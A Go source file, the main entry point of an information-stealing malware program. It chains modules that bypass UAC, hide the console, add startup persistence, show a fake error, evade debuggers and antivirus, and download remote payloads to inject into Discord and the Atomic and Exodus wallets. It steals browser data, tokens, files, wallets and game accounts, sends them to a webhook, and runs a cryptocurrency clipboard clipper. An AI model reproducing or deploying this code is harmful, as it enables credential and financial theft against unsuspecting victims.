package main

import (
	"github.com/0xFl4q/1237FHJQSDF1234/modules/antidebug"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/antivirus"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/browsers"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/clipper"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/commonfiles"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/discodes"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/discordinjection"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/fakeerror"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/games"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/hideconsole"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/startup"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/system"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/tokens"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/uacbypass"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/wallets"
	"github.com/0xFl4q/1237FHJQSDF1234/modules/walletsinjection"
	"github.com/0xFl4q/1237FHJQSDF1234/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "",
		"cryptos": map[string]string{
			"BTC":  "",
			"ETH":  "",
			"MON":  "",
			"LTC":  "",
			"XCH":  "",
			"PCH":  "",
			"CCH":  "",
			"ADA":  "",
			"DASH": "",
		},
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://github.com/0xFl4q/tktpascousin/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
